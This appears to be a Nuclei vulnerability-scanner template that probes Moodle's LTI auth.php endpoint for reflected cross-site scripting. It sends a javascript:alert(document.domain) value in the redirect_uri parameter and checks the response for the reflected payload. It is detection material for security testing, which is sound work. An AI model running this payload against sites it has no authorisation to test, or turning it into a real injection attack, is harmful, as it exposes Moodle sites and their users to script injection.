id: kaue-xss-moddle

info:
  name: kauexss-moddle
  author: kauenavarro
  severity: medium
  description: Procura por respostas refletidas.
  tags: xss
requests:
  - method: GET
    path:
      - "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)"
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "alert(document.domain)"
        part: body
        condition: or

      - type: word
        words:
          - "text/html"
        part: header

      - type: word
        words:
          - "<title>Access Denied</title>"
          - "You don't have permission to access"
        part: body
        condition: and
        negative: true

      - type: status
        status:
          - 200
